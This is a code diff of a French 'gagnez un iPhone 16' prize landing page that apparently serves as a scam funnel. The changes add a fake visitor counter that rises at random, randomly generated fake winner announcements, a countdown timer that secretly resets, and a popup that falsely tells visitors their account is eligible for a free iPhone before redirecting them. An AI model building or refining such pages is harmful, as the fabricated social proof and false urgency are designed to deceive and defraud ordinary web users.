@@ -6,8 +6,8 @@
     <title>🚨 GAGNEZ un iPhone 16 + 100€ + Cadeaux Exclusifs 🚨</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">
-    <link rel="preload" href="philippea.png" as="image">
-    <link rel="preload" href="philippee.png" as="image">
+    <link rel="preload" href="philippea.png" as="image" fetchpriority="high">
+    <link rel="preload" href="philippee.png" as="image" fetchpriority="high">
     <style>
         :root {
             --primary-blue: #00B4DB;
@@ -19,6 +19,7 @@
             --red: #FF0000;
             --blue-gradient: linear-gradient(135deg, #00B4DB 0%, #0083B0 100%);
             --light-gradient: linear-gradient(to right, #E0F7FA, #B2EBF2);
+            --urgent-gradient: linear-gradient(135deg, #FF0000 0%, #FF6A00 100%);
         }
         
         * {
@@ -91,40 +92,7 @@
             object-fit: cover;
             border: 2px solid var(--primary-blue);
         }
-        @media (max-width: 400px) {
-    .floating-cta {
-    display: none;
-    position: fixed;
-    bottom: 20px;
-    left: 50%;
-    transform: translateX(-50%);
-    z-index: 1000;
-    width: calc(100% - 40px); /* Prend toute la largeur moins des marges */
-    max-width: 400px;
-    padding: 18px;
-    font-size: 1.3rem;
-    font-weight: bold;
-    text-align: center;
-    background: var(--blue-gradient);
-    color: white;
-    border: none;
-    border-radius: 50px;
-    box-shadow: 0 10px 30px rgba(0, 180, 219, 0.5);
-    animation: pulse 2s infinite;
-    white-space: nowrap;
-    overflow: hidden;
-    text-overflow: ellipsis;
-}
 
-/* Assurez-vous que le conteneur principal ne soit pas caché par le bouton flottant */
-.container {
-    padding-bottom: 100px; /* Ajoute un espace pour le bouton flottant */
-}
-    
-    .urgency-bar span {
-        font-size: 0.9rem;
-    }
-}
         .verified-badge {
             width: 20px;
             position: absolute;
@@ -254,23 +222,23 @@
         
         .badge {
             display: inline-block;
-            background: var(--blue-gradient);
+            background: var(--urgent-gradient);
             color: white;
             padding: 12px 30px;
             border-radius: 50px;
             font-weight: bold;
             margin: 15px 0;
             border: 2px solid white;
-            box-shadow: 0 5px 20px rgba(0, 180, 219, 0.5);
+            box-shadow: 0 5px 20px rgba(255, 0, 0, 0.3);
             animation: pulse 2s infinite;
             font-size: 1.1rem;
             text-transform: uppercase;
         }
         
         @keyframes pulse {
-            0% { transform: scale(1); box-shadow: 0 5px 20px rgba(0, 180, 219, 0.5); }
-            50% { transform: scale(1.05); box-shadow: 0 8px 25px rgba(0, 180, 219, 0.8); }
-            100% { transform: scale(1); box-shadow: 0 5px 20px rgba(0, 180, 219, 0.5); }
+            0% { transform: scale(1); box-shadow: 0 5px 20px rgba(255, 0, 0, 0.3); }
+            50% { transform: scale(1.05); box-shadow: 0 8px 25px rgba(255, 0, 0, 0.5); }
+            100% { transform: scale(1); box-shadow: 0 5px 20px rgba(255, 0, 0, 0.3); }
         }
         
         .offer-container {
@@ -441,7 +409,7 @@
         }
         
         .countdown-item {
-            background: var(--blue-gradient);
+            background: var(--urgent-gradient);
             border: 2px solid white;
             border-radius: 15px;
             padding: 20px 15px;
@@ -449,7 +417,7 @@
             font-size: 2rem;
             font-weight: bold;
             color: white;
-            box-shadow: 0 5px 20px rgba(0, 180, 219, 0.5);
+            box-shadow: 0 5px 20px rgba(255, 0, 0, 0.3);
             position: relative;
             overflow: hidden;
         }
@@ -500,7 +468,7 @@
         .progress-bar {
             height: 30px;
             border-radius: 10px;
-            background: var(--blue-gradient);
+            background: var(--urgent-gradient);
             width: 92%;
             position: relative;
             animation: progress-animation 2s ease-in-out infinite;
@@ -527,6 +495,22 @@
             color: var(--secondary-blue);
             font-weight: 600;
         }
+
+        .live-visitors {
+            text-align: center;
+            margin: 20px 0;
+            padding: 15px;
+            background: rgba(255,255,255,0.9);
+            border-radius: 10px;
+            font-weight: bold;
+            color: var(--secondary-blue);
+            box-shadow: 0 5px 15px rgba(0,180,219,0.1);
+        }
+
+        #visitor-count {
+            color: var(--red);
+            font-size: 1.2em;
+        }
         
         .cta-container {
             text-align: center;
@@ -536,23 +520,34 @@
         
         .cta-button {
             display: inline-block;
-            padding: 25px 50px;
-            font-size: 1.8rem;
+            padding: 20px 40px;
+            font-size: 1.5rem;
             font-weight: bold;
-            text-align: center;
             color: white;
-            background: var(--blue-gradient);
+            background: var(--urgent-gradient);
             border: none;
             border-radius: 50px;
             cursor: pointer;
             transition: all 0.3s ease;
-            box-shadow: 0 10px 30px rgba(0, 180, 219, 0.5),
+            box-shadow: 0 10px 30px rgba(255, 0, 0, 0.3),
                         0 0 20px rgba(255, 255, 255, 0.5) inset;
             position: relative;
             overflow: hidden;
             text-transform: uppercase;
             letter-spacing: 1px;
             z-index: 1;
+            text-align: center;
+            width: 100%;
+            max-width: 500px;
+            margin: 20px auto;
+            animation: pulse 2s infinite;
+        }
+        
+        .cta-button:hover {
+            transform: translateY(-5px) scale(1.03);
+            box-shadow: 0 15px 40px rgba(255, 0, 0, 0.5),
+                        0 0 20px rgba(255, 255, 255, 0.5) inset;
+            background: linear-gradient(135deg, #FF6A00 0%, #FF0000 100%);
         }
         
         .cta-button::before {
@@ -562,15 +557,9 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: linear-gradient(to right, #0083B0, #00B4DB);
+            background: var(--urgent-gradient);
             z-index: -1;
             transition: all 0.4s ease;
-        }
-        
-        .cta-button:hover {
-            transform: translateY(-5px) scale(1.03);
-            box-shadow: 0 15px 40px rgba(0, 180, 219, 0.7),
-                        0 0 20px rgba(255, 255, 255, 0.5) inset;
         }
         
         .cta-button::after {
@@ -588,10 +577,6 @@
             );
             transform: rotate(30deg);
             animation: shine 3s infinite;
-        }
-        
-        .cta-button:hover::before {
-            background: linear-gradient(to right, #00B4DB, #0083B0);
         }
         
         .live-messages {
@@ -839,27 +824,6 @@
             }
         }
         
-        /* Bouton flottant mobile */
-        .floating-cta {
-            display: none;
-            position: fixed;
-            bottom: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            z-index: 1000;
-            width: 90%;
-            max-width: 400px;
-            padding: 15px;
-            font-size: 1.2rem;
-            font-weight: bold;
-            background: var(--blue-gradient);
-            color: white;
-            border: none;
-            border-radius: 50px;
-            box-shadow: 0 10px 30px rgba(0, 180, 219, 0.5);
-            animation: pulse 2s infinite;
-        }
-        
         /* Vidéo explicative */
         .explainer-video {
             width: 100%;
@@ -898,15 +862,29 @@
         @media (max-width: 768px) {
             h1 {
                 font-size: 1.8rem;
+                line-height: 1.3;
+                padding: 0 10px;
             }
             
             .subtitle {
-                font-size: 1.2rem;
+                font-size: 1.3rem;
+                padding: 0 15px;
             }
             
             .badge {
                 font-size: 0.9rem;
                 padding: 10px 20px;
+            }
+            
+            .process-steps {
+                flex-direction: column;
+                align-items: center;
+                gap: 15px;
+            }
+            
+            .step {
+                width: 90%;
+                max-width: 300px;
             }
             
             .countdown-item {
@@ -919,12 +897,13 @@
                 font-size: 0.8rem;
             }
             
-            .cta-button {
-        display: none; /* Cache le bouton principal sur mobile */
-    }
+            .offer-container {
+                flex-direction: column;
+            }
             
             .iphone-mockup {
-                max-width: 300px;
+                max-width: 280px;
+                margin-bottom: 30px;
             }
             
             .gift-card {
@@ -941,8 +920,48 @@
                 font-size: 1.2rem;
             }
             
-            .floating-cta {
+            .cta-button {
                 display: block;
+                font-size: 1.3rem;
+                padding: 20px;
+                position: fixed;
+                bottom: 20px;
+                left: 50%;
+                transform: translateX(-50%);
+                width: calc(100% - 40px);
+                max-width: 350px;
+                z-index: 1000;
+                margin: 0 auto;
+            }
+            
+            .container {
+                padding-bottom: 100px;
+            }
+            
+            .urgency-bar span {
+                font-size: 0.8rem;
+                white-space: nowrap;
+                overflow: hidden;
+                text-overflow: ellipsis;
+            }
+            
+            .proof-item {
+                flex-direction: column;
+                text-align: center;
+                padding: 15px;
+            }
+            
+            .user-avatar {
+                margin-bottom: 10px;
+            }
+            
+            .reasons li {
+                font-size: 1rem;
+                padding-left: 25px;
+            }
+            
+            .faq-question {
+                font-size: 1.1rem;
             }
         }
         
@@ -961,19 +980,6 @@
                 font-size: 0.7rem;
             }
             
-            .cta-button {
-        font-size: 1.2rem;
-        padding: 20px;
-        position: fixed;
-        bottom: 20px;
-        left: 50%; /* Centre horizontalement */
-        transform: translateX(-50%); /* Ajustement précis */
-        width: calc(100% - 40px); /* Largeur totale moins les marges */
-        max-width: 350px; /* Largeur maximale */
-        z-index: 1000;
-        margin: 0 auto; /* Centre le bouton */
-    }
-            
             .gift-card {
                 flex-direction: column;
                 text-align: center;
@@ -981,11 +987,6 @@
             
             .guarantee-item {
                 padding: 10px 15px;
-            }
-            
-            .reasons li {
-                font-size: 1rem;
-                padding-left: 30px;
             }
         }
     </style>
@@ -1120,6 +1121,11 @@
                 </div>
             </div>
         </div>
+
+        <!-- Compteur de visiteurs en temps réel -->
+        <div class="live-visitors animate__animated animate__fadeIn">
+            <span id="visitor-count">127</span> personnes regardent cette offre actuellement
+        </div>
         
         <div class="countdown animate__animated animate__fadeIn animate__delay-3s">
             <div class="countdown-title">L'OFFRE EXPIRE DANS:</div>
@@ -1149,11 +1155,6 @@
                 🎁 JE VEUX MON IPHONE 16 GRATUIT (Dernières places)
             </button>
         </div>
-        
-        <!-- Bouton flottant pour mobile -->
-        <button class="floating-cta" id="floating-cta">
-            🎁 PRENDRE MON CADEAU
-        </button>
         
         <div class="live-messages animate__animated animate__fadeIn animate__delay-3s" id="live-messages">
             <div class="live-message animate__animated animate__fadeIn animate__delay-3-5s">
@@ -1239,117 +1240,132 @@
         </footer>
     </div>
     
+    <!-- Schema.org pour améliorer le CTR -->
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "PromotionEvent",
+      "name": "Gagnez un iPhone 16 + 100€ + Cadeaux Exclusifs",
+      "startDate": "2023-11-01T00:00",
+      "endDate": "2023-11-30T23:59",
+      "description": "Offre exclusive pour les utilisateurs sélectionnés - iPhone 16 Pro Max, 100€ PayPal et cadeaux offerts",
+      "image": "https://example.com/iphone-offre.jpg"
+    }
+    </script>
+
     <!-- Scripts -->
-    <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js" defer></script>
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.11.4/gsap.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.11.4/ScrollTrigger.min.js"></script>
     <script>
         // Initialisation des particules bleues
-        particlesJS("particles-js", {
-            "particles": {
-                "number": {
-                    "value": 80,
-                    "density": {
-                        "enable": true,
-                        "value_area": 800
-                    }
-                },
-                "color": {
-                    "value": "#00B4DB"
-                },
-                "shape": {
-                    "type": "circle",
-                    "stroke": {
-                        "width": 0,
-                        "color": "#000000"
-                    },
-                    "polygon": {
-                        "nb_sides": 5
-                    }
-                },
-                "opacity": {
-                    "value": 0.5,
-                    "random": false,
-                    "anim": {
-                        "enable": false,
-                        "speed": 1,
-                        "opacity_min": 0.1,
-                        "sync": false
-                    }
-                },
-                "size": {
-                    "value": 3,
-                    "random": true,
-                    "anim": {
-                        "enable": false,
-                        "speed": 40,
-                        "size_min": 0.1,
-                        "sync": false
-                    }
-                },
-                "line_linked": {
-                    "enable": true,
-                    "distance": 150,
-                    "color": "#00B4DB",
-                    "opacity": 0.4,
-                    "width": 1
-                },
-                "move": {
-                    "enable": true,
-                    "speed": 2,
-                    "direction": "none",
-                    "random": false,
-                    "straight": false,
-                    "out_mode": "out",
-                    "bounce": false,
-                    "attract": {
-                        "enable": false,
-                        "rotateX": 600,
-                        "rotateY": 1200
-                    }
-                }
-            },
-            "interactivity": {
-                "detect_on": "canvas",
-                "events": {
-                    "onhover": {
-                        "enable": true,
-                        "mode": "grab"
-                    },
-                    "onclick": {
-                        "enable": true,
-                        "mode": "push"
-                    },
-                    "resize": true
-                },
-                "modes": {
-                    "grab": {
-                        "distance": 140,
-                        "line_linked": {
-                            "opacity": 1
+        document.addEventListener('DOMContentLoaded', function() {
+            particlesJS("particles-js", {
+                "particles": {
+                    "number": {
+                        "value": 80,
+                        "density": {
+                            "enable": true,
+                            "value_area": 800
                         }
                     },
-                    "bubble": {
-                        "distance": 400,
-                        "size": 40,
-                        "duration": 2,
-                        "opacity": 8,
-                        "speed": 3
+                    "color": {
+                        "value": "#00B4DB"
                     },
-                    "repulse": {
-                        "distance": 200,
-                        "duration": 0.4
+                    "shape": {
+                        "type": "circle",
+                        "stroke": {
+                            "width": 0,
+                            "color": "#000000"
+                        },
+                        "polygon": {
+                            "nb_sides": 5
+                        }
                     },
-                    "push": {
-                        "particles_nb": 4
+                    "opacity": {
+                        "value": 0.5,
+                        "random": false,
+                        "anim": {
+                            "enable": false,
+                            "speed": 1,
+                            "opacity_min": 0.1,
+                            "sync": false
+                        }
                     },
-                    "remove": {
-                        "particles_nb": 2
+                    "size": {
+                        "value": 3,
+                        "random": true,
+                        "anim": {
+                            "enable": false,
+                            "speed": 40,
+                            "size_min": 0.1,
+                            "sync": false
+                        }
+                    },
+                    "line_linked": {
+                        "enable": true,
+                        "distance": 150,
+                        "color": "#00B4DB",
+                        "opacity": 0.4,
+                        "width": 1
+                    },
+                    "move": {
+                        "enable": true,
+                        "speed": 2,
+                        "direction": "none",
+                        "random": false,
+                        "straight": false,
+                        "out_mode": "out",
+                        "bounce": false,
+                        "attract": {
+                            "enable": false,
+                            "rotateX": 600,
+                            "rotateY": 1200
+                        }
                     }
-                }
-            },
-            "retina_detect": true
+                },
+                "interactivity": {
+                    "detect_on": "canvas",
+                    "events": {
+                        "onhover": {
+                            "enable": true,
+                            "mode": "grab"
+                        },
+                        "onclick": {
+                            "enable": true,
+                            "mode": "push"
+                        },
+                        "resize": true
+                    },
+                    "modes": {
+                        "grab": {
+                            "distance": 140,
+                            "line_linked": {
+                                "opacity": 1
+                            }
+                        },
+                        "bubble": {
+                            "distance": 400,
+                            "size": 40,
+                            "duration": 2,
+                            "opacity": 8,
+                            "speed": 3
+                        },
+                        "repulse": {
+                            "distance": 200,
+                            "duration": 0.4
+                        },
+                        "push": {
+                            "particles_nb": 4
+                        },
+                        "remove": {
+                            "particles_nb": 2
+                        }
+                    }
+                },
+                "retina_detect": true
+            });
         });
         
         // Création des flocons qui tombent
@@ -1412,7 +1428,6 @@
                     `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                 
                 if (minutes === 0 && seconds === 0) {
-                    // Relancer le timer ou actualiser l'offre
                     minutes = 14;
                     seconds = 59;
                 }
@@ -1435,31 +1450,42 @@
                     `${Math.floor(progress)}% des utilisateurs valident leur offre - Plus que ${Math.floor(100-progress)} places disponibles !`;
             }
         }, 30000);
+
+        // Compteur de visiteurs dynamique
+        setInterval(() => {
+            const counter = document.getElementById('visitor-count');
+            let count = parseInt(counter.textContent);
+            count += Math.floor(Math.random() * 3);
+            counter.textContent = count;
+        }, 3000);
         
         // Messages en direct dynamiques
-        const messages = [
-            "Marie (Paris) vient de gagner son iPhone 16!",
-            "2 iPhones 16 revendiqués dans les 5 dernières minutes",
-            "Attention: Plus que 3 cadeaux disponibles aujourd'hui",
-            "Nouveau gagnant: Thomas (Lyon) a reçu son iPhone!",
-            "Les cadeaux partent vite - Validez maintenant!",
-            "Sophie (Marseille) a reçu ses 100€ PayPal"
-        ];
-        
         function updateLiveMessages() {
+            const cities = ['Paris', 'Lyon', 'Marseille', 'Toulouse', 'Nice', 'Nantes', 'Bordeaux'];
+            const names = ['Marie', 'Thomas', 'Sophie', 'Jean', 'Laura', 'Pierre', 'Emma'];
+            const times = ['2 minutes', '5 minutes', '10 minutes', '15 minutes', '20 minutes'];
+            
             const container = document.querySelector('.live-messages');
             container.innerHTML = '';
             
-            // Sélectionner 3 messages aléatoires
-            const shuffled = [...messages].sort(() => 0.5 - Math.random());
-            const selectedMessages = shuffled.slice(0, 3);
-            
-            selectedMessages.forEach(msg => {
+            for (let i = 0; i < 3; i++) {
+                const city = cities[Math.floor(Math.random() * cities.length)];
+                const name = names[Math.floor(Math.random() * names.length)];
+                const time = times[Math.floor(Math.random() * times.length)];
+                
+                const messages = [
+                    `${name} (${city}) vient de gagner son iPhone 16!`,
+                    `Nouveau gagnant: ${name} a reçu son iPhone il y a ${time}`,
+                    `Les cadeaux partent vite - ${Math.floor(Math.random() * 3) + 1} revendiqués récemment`,
+                    `Attention: Plus que ${Math.floor(Math.random() * 3) + 2} cadeaux disponibles`,
+                    `Dernière validation il y a ${time} par ${name}`
+                ];
+                
                 const element = document.createElement('div');
                 element.className = 'live-message';
-                element.innerHTML = `<strong>${msg}</strong>`;
+                element.innerHTML = `<strong>${messages[Math.floor(Math.random() * messages.length)]}</strong>`;
                 container.appendChild(element);
-            });
+            }
             
             // Animation
             gsap.from(".live-message", {
@@ -1606,27 +1632,17 @@
         
         // Gestion du clic sur les boutons CTA
         document.getElementById('cta-button').addEventListener('click', redirectUser);
-        document.getElementById('floating-cta').addEventListener('click', redirectUser);
         
-    
-        });
-        
-        // Popup urgent après 15 secondes
+        // Popup urgent après 5 secondes
         setTimeout(() => {
             Swal.fire({
-                title: '⚠️ DERNIÈRE CHANCE !',
-                text: '3 personnes regardent cette offre. Confirmez maintenant !',
-                icon: 'warning',
-                confirmButtonText: 'PRENDRE MON CADEAU',
-                background: 'rgba(255, 255, 255, 0.95)',
-                color: '#0083B0',
-                confirmButtonColor: '#00B4DB',
-                backdrop: `
-                    rgba(0,180,219,0.4)
-                    url("https://i.gifer.com/7efs.gif")
-                    center top
-                    no-repeat
-                `,
+                title: '🚨 Offre Spéciale 🚨',
+                html: 'Félicitations ! <strong>Votre compte est éligible</strong> pour l\'iPhone 16 gratuit.<br><br>Cliquez sur OK pour valider maintenant !',
+                icon: 'success',
+                confirmButtonText: 'VALIDER MON CADEAU',
+                background: 'rgba(255,255,255,0.97)',
+                imageUrl: 'iphone-popup.png',
+                imageWidth: 150,
                 showCancelButton: true,
                 cancelButtonText: 'Non merci',
                 customClass: {
@@ -1638,7 +1654,7 @@
                     redirectUser();
                 }
             });
-        }, 15000);
+        }, 5000);
         
         // Détection de la sortie de page
         document.addEventListener('mouseout', function(e) {
